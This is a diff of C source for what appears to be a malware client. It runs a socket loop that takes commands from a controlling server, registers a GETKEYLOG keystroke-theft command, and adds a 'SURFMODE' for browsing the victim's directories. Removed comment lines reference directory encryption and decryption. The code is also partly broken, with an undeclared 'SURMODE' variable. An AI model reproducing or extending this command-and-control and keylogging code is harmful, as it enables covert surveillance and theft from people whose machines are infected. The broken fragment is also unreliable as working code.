@@ -1,6 +1,7 @@
 #include "socket.h"
 #include "common.h"
 #include "../target/command.h"
+#include "../target/SURF/seeDirectory.h"
 
 #ifdef _WIN32
 #else
@@ -299,7 +300,7 @@ DWORD WINAPI getMessageController(LPVOID paramT){
 				memset(server_reply, '\0', sizeof(server_reply));
 			}
 		}
-		Sleep(1000);
+		Sleep(100);
 	}
 	return 0;
 }
@@ -407,10 +408,10 @@ void * getMessage (void * vParam){
 
 // FUNGSI UTAMA COMMAND
 #ifdef _WIN32
-DWORD WINAPI execMessage(LPVOID paramT){
-	if (paramT == NULL) return -1;
+DWORD WINAPI execMessage(LPVOID paramTh){
+	if (paramTh == NULL) return -1;
 
-	paramThread * param = (paramThread *)paramT;
+	paramSurf * param = (paramSurf *)paramTh;
 	char server_reply[1024] = {0};
 	int recv_size = 0;
 
@@ -423,38 +424,28 @@ DWORD WINAPI execMessage(LPVOID paramT){
 	addCommand("HALLO", (void *)HALLO, normalCommandPack);
 	addCommand("GETKEYLOG", (void *)GETKEYLOG, normalCommandPack);
 
-	box surfCommandPack;
-	inisialisasi(surfCommandPack);
-
-	//addCommand("1", (void *)showMenu, surfCommandPack);
-	//addCommand("2", (void *)dirStructure, surfCommandPack);
-	//addCommand("3", (void *)printTree, surfCommandPack);
-	//addCommand("4", (void *)pwd, surfCommandPack);
-	//addCommand("5", (void *)encryptDir, surfCommandPack);
-	//addCommand("6", (void *)decryptDir, surfCommandPack);
-
 	unsigned char SURFMODE = 0;
 
 	while(1){
-		while((param)->socketStatus == 'c' || (param)->socketStatus == 's'){
-			recv_size = recv((param)->clientSocket, server_reply, sizeof(server_reply), 0);
+		while((param->paramT)->socketStatus == 'c' || (param->paramT)->socketStatus == 's'){
+			recv_size = recv((param->paramT)->clientSocket, server_reply, sizeof(server_reply), 0);
 			if (recv_size == 0 || recv_size == SOCKET_ERROR) {
-				if((param)->socketStatus == 'c') (param)->socketStatus = 'x';
-				else (param)->socketStatus = 'X';
+				if((param->paramT)->socketStatus == 'c') (param->paramT)->socketStatus = 'x';
+				else (param->paramT)->socketStatus = 'X';
 				break;
 			} else {
 				if(strcmp(server_reply, "SURFMODE") == 0){
 					SURFMODE = 1;
 					memset(server_reply, '\0', sizeof(server_reply));
 					continue;
-				}else if(strcmp(server_reply, "ENDSURFMODE") == 0){
+				}else if(strcmp(server_reply, "END") == 0){
 					SURFMODE = 0;
 					memset(server_reply, '\0', sizeof(server_reply));
 					continue;	
 				}
 
-				if (SURFMODE == 0) proccess(server_reply, param, normalCommandPack);
-				else if (SURMODE == 1)
+				if (SURFMODE == 0) proccess(server_reply, param->paramT, normalCommandPack);
+				else if (SURMODE == 1) strcpy((param)->input, server_reply);
 
 				//printf("Server reply: %s\n", server_reply);
 				memset(server_reply, '\0', sizeof(server_reply));
